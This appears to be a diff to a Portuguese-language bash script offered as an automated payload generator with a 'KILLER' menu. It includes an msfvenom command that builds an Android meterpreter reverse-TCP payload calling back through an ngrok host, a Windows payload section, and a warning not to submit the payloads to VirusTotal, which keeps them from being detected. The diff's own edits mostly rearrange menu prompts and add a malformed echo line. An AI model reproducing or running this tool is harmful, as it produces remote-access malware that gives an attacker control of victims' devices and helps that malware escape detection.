@@ -1,4 +1,3 @@
-
 #!/bin/bash 
 # ------------------------------------------------------------------------
 # ESTA FERRAMENTA ELA PERMITE GERAR UM PAYLOAD AUTOMATIZADO              *
@@ -46,7 +45,7 @@ echo "								 "
 echo "							         "
 echo "=========================================================";
 echo "   POR FAVOR NAO TESTAR OS PAYLOADS NO WWW.VIRUSTOTAL.COM "
-echo "		   $(uname -a | cut -d '#' -f 1) "
+echo "	your sistem: $(uname -a | cut -d '#' -f 1) "
 echo "=========================================================";
 
 read -rsp $'pressiona [ENTER] para continuar........... \n' -n 1 key
@@ -262,21 +261,7 @@ echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n"
 fi
-echo "digite MENU ou SAIR!"
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
-      echo -ne  " └─────► "
-	read res
-if [ $res == "MENU" ] 
-then
-menu
-elif [ $res == "SAIR" ] 
-then
-echo "SAINDO..."
-sleep 0.5
-exit
-fi
-
-#######################################################3
+#################3
 if [ "$resposta" == "NGROK" ]
 then
 echo -e "${CLARO}[+]INFORME A PORTA QUE O NGROK GEROU[+]"
@@ -294,8 +279,23 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$port R >
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
-echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-="
+echo "digite MENU ou SAIR!"
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+	read res
+if [ $res == "MENU" ] 
+then
+menu
+elif [ $res == "SAIR" ] 
+then
+echo "SAINDO..."
+sleep 0.5
+exit
 fi
+fi
+#######################################################3
+
 ####################################################
 #####PAYLOAD EM WINDOWS#####
 elif [ "$fatrat" -eq "3" ];then
@@ -314,7 +314,9 @@ echo -e " \___________/                                            \n"
 
 
 sleep 2
-
+echo "-------------------------"
+echo -e "seu ip interno:$lanip| 
+echo "-------------------------"
 echo -e "${CYAN}[*]digite seu ip interno[ETH0]"
 echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
